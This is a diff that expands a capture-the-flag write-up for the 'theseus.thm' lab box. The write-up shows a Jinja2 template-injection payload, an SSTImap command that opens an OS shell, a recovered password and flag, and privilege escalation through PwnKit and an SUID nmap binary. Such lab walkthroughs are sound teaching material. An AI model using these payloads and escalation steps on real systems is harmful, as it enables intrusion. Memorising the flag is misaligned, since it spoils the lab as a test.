@@ -54,7 +54,7 @@ PORT     STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-The encoded message on the webpage `http://theseus.thm:8080/` `TGUE?O, S, K, MTUEGI, SYENFE, TOI,, SRO, T, SF, OYT,, O, T, KUMH, I, AE, NMK, ` decodes into the following.
+The web application at `http://theseus.thm:8080/` greeted me with an oddly formatted string, `TGUE?O, S, K, MTUEGI, SYENFE, TOI,, SRO, T, SF, OYT,, O, T, KUMH, I, AE, NMK, `, that was clearly meant to be worked out rather than ignored. Once I worked through the encoding, it decoded into a message that was effectively handing me my next move:
 
 ```bash
 TO·GET·TO·KING·MINOS·YOU·MUST·FIRST·MAKE·USE·OF·THE·?KEY·········
@@ -62,15 +62,15 @@ TO·GET·TO·KING·MINOS·YOU·MUST·FIRST·MAKE·USE·OF·THE·?KEY······
 
 ![Pasted image 20250519232350](Pasted-image-20250519232350.png)![Pasted image 20250519232613](Pasted-image-20250519232613.png)
 
-I trued using key as a parameter and it seems to display what is in the query on the webpage I am going to attempt to fuzz for more information. I tried using `cewl` to make a wordlist from the website and fuzz.
+Taking the hint at face value, I tried supplying `key` as a query parameter, and the page reflected whatever value I gave it straight back into the response. That kind of direct reflection is exactly the sort of behavior worth fuzzing further, so my first idea was building a targeted wordlist from the site's own content with `cewl` rather than reaching for a generic dictionary:
 
 ```bash
 cewl http://theseus.thm:8080/ -w wordlist.lst
 ```
 
-Did not get anywhere also tried to see if the image on the website was a stego file got nothing.
+That approach didn't turn up anything useful. I also checked whether the image on the page was hiding data through steganography, on the theory that a puzzle-heavy box like this one might layer more than one trick together, but that came back empty too.
 
-I tried looking for other parameters as well..
+Rather than keep guessing manually, I decided to let a proper parameter discovery tool take a pass at the endpoint:
 ```bash
 └─[$] arjun -u http://theseus.thm:8080/                                                                                           [0:14:10]
     _
@@ -86,7 +86,7 @@ I tried looking for other parameters as well..
 [+] Parameters found: key
 ```
 
-Since the http server is running python I tried template injection and was able to get it to work!
+With `arjun` confirming `key` as a real parameter and the server's own headers already telling me this was a Python/Werkzeug application, server-side template injection was the obvious next thing to test. Flask applications commonly render user input through Jinja2, and if `key` was landing inside a template context unsanitized, a basic arithmetic payload would prove it immediately:
 
 ```http
 GET /?key={{+7*7+}} HTTP/1.1
@@ -112,6 +112,8 @@ Date: Tue, 20 May 2025 04:15:36 GMT
 49
 ```
 
+Getting `49` back confirmed the injection was live, since that's exactly `7*7` evaluated by the Jinja2 engine rather than the literal string. Manually crafting a full RCE payload from there was possible, but I chose to let `SSTImap` automate the escalation from confirmed injection to an interactive shell, since it already handles the different sandbox-escape payloads Jinja2 versions require:
+
 ```bash
 python3 ~/SSTImap/sstimap.py -u "http://theseus.thm:8080/?key=test" --os-shell -l 5 -e jinja2
 ```
@@ -120,12 +122,16 @@ python3 ~/SSTImap/sstimap.py -u "http://theseus.thm:8080/?key=test" --os-shell -
 
 ### First flag
 
+That shell dropped me in as `minos`, and grabbing the first flag was the natural first move before digging any further into the box.
+
 ```bash
 posix-linux2 $ cat /home/minos/Minos_Flag
 THM{499a89a2a064426921732e7d31bc08a}
 ```
 
 ![Pasted image 20250520003011](Pasted-image-20250520003011.png)
+
+With the flag secured, I kept enumerating `minos`'s home directory for anything else useful and turned up another file worth reading in full, since this box's theme of hiding real credentials inside narrative text had already paid off once with the initial hint.
 
 ```bash
 69022 -rw-r--r-- 1 minos minos 960 Aug 20  2020 /home/minos/Crete_Shores
@@ -164,7 +170,7 @@ Password: Knossos
 posix-linux2 $ sudo -u entrance whoami
 ```
 
-I was able to modify the request to get a reverse shell.
+The story text also handed me a working credential, `entrance:Knossos`, which was a clear invitation to escalate to that account through `sudo -u entrance` rather than staying on the `SSTImap`-provided shell. Before doing that, though, I wanted a more stable foothold of my own, so I modified the SSTI payload directly to reach for a proper reverse shell instead of relying on the tool's built-in pseudo-shell.
 
 
 ```http
@@ -185,15 +191,17 @@ Priority: u=0, i
 
 #### Getting root
 
-the system is vulnerable to the `PwnKit` Exploit once I uploaded the compiled exploit and executed it I got root.
+With a shell as `entrance`, I checked the kernel and distro version out of habit, and it lined up with the vulnerable range for **PwnKit (CVE-2021-4034)**, a local privilege escalation in `pkexec`'s argument handling that had already become a reliable go-to for me on Ubuntu boxes from this era. I compiled the exploit for the target architecture, uploaded it, and executed it, and it dropped me straight into a root shell with no further effort.
 
 ![Pasted image 20250520003708](Pasted-image-20250520003708.png)
 
 #### Escalating Privileges the intended way
 
+PwnKit got me there fast, but I wanted to go back and find the path the box actually intended, since a generic CVE isn't always the lesson a machine is trying to teach. Running through the standard SUID enumeration turned up something specific to this box:
+
 ![Pasted image 20250520003827](Pasted-image-20250520003827.png)
 
-We can see that `nmap` is set as a SUID binary we can visit [This GTFO Bins page](https://gtfobins.github.io/gtfobins/nmap/#suid) to see how to privesc using `nmap` as `SUID`.
+The `nmap` binary itself was set SUID, which was the real giveaway. Older versions of `nmap` support an interactive scripting mode capable of running arbitrary Lua, and when the binary carries the SUID bit, that scripting engine executes with the file owner's privileges rather than the calling user's. [GTFOBins' nmap entry](https://gtfobins.github.io/gtfobins/nmap/#suid) documents the exact technique, so I followed it directly.
 
 #### How to privesc using nmap SUID
 
